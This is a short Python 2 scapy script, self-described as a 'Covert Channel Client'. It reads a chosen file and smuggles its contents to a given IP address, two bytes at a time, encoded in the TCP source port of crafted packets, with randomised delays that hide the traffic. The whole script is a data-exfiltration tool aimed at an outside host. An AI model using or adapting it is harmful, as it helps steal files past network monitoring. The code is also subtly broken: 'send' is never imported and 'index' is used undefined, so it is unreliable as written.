import logging
# don't output warnings from scapy, kthx
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, TCP
from random import randint
import setproctitle
import argparse
import time
import os

global maxPort
global lastPosition
global fileSize
maxPort = 65535
asciiMax = 127
lastPosition = 0
fileSize = 0

# creates a packet where the arguments char1 and char2 are set as the tcp source port
def createPacketTwo(char1, char2):
  # get the binary values of both chars without the binary string indicator
  binChar1 = bin(ord(char1))[2:].zfill(8)
  binChar2 = bin(ord(char2))[2:].zfill(8)
  print binChar1 + binChar2
  # get the integer value of the concatenated binary values
  intPortVal = int(binChar1 + binChar2, 2)
  print "bin value " + str((bin(intPortVal)))

  packet = IP(dst=args.destIp)/TCP(dport=80, sport=maxPort - intPortVal)
  return packet

# create a packet when we only have 1 character remaining
def createPacketOne(char):
  # get the binary value of the character
  binChar = bin(ord(char))[2:].zfill(8)
  print binChar
  #get the integer value of that binary value
  intPortVal = int(binChar, 2)

  packet = IP(dst=args.destIp)/TCP(dport=80, sport=maxPort -intPortVal)
  return packet

def readOneByte(fileDescriptor):
  global lastPosition
  fileDescriptor.seek(lastPosition)
  byte = fileDescriptor.read(1)
  lastPosition = fileDescriptor.tell()
  return byte


def sendPackets():
  global fileSize
  global lastPosition
  fileDescriptor = open(args.path, 'r')
  while lastPosition < fileSize:
    if lastPosition == fileSize - 1:
      char = readOneByte(fileDescriptor)
      packet = createPacketOne(char)
    else:
      char1 = readOneByte(fileDescriptor)
      char2 = readOneByte(fileDescriptor)
      packet = createPacketTwo(char1, char2)

    send(packet)
    index = index + 2

    print "sport: " + str(packet.sport)
    time.sleep(randint(1,int(args.sendInterval)))

# start of execution
parser = argparse.ArgumentParser(description='Covert Channel Client')
parser.add_argument('-p'
                   , '--path'
                   , dest='path'
                   , help='absolute path to file to watch.'
                   , required=True)
parser.add_argument('-d'
                   , '--destination'
                   , dest='destIp'
                   , help='IP address to covertly send data too.'
                   , required=True)
parser.add_argument('-i'
                   , '--interval'
                   , dest='sendInterval'
                   , help='Max interval to wait between sends, in seconds.'
                   , required=True)
args = parser.parse_args()
fileSize = os.path.getsize(args.path)
sendPackets()